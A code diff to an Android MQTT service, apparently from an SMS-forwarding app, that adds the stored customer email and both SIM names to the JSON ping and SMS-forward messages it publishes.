@@ -198,6 +198,7 @@ public class MqttService extends Service {
                     pingData.put("device_name", Build.MODEL);
                     pingData.put("sim1_name", prefs.getString("sim1_name", "Unknown SIM 1"));
                     pingData.put("sim2_name", prefs.getString("sim2_name", "Unknown SIM 2"));
+                    pingData.put("email", prefs.getString("customer_email", ""));
                     pingData.put("timestamp", System.currentTimeMillis());
 
                     MqttMessage msg = new MqttMessage(pingData.toString().getBytes());
@@ -262,6 +263,9 @@ public class MqttService extends Service {
                 json.put("phone", phone);
                 json.put("sms", smsBody);
                 json.put("sim", simName);
+                json.put("sim1", prefs.getString("sim1_name", ""));
+                json.put("sim2", prefs.getString("sim2_name", ""));
+                json.put("email", prefs.getString("customer_email", ""));
                 String rawJson = json.toString();
 
                 boolean atLeastOneSuccess = false;
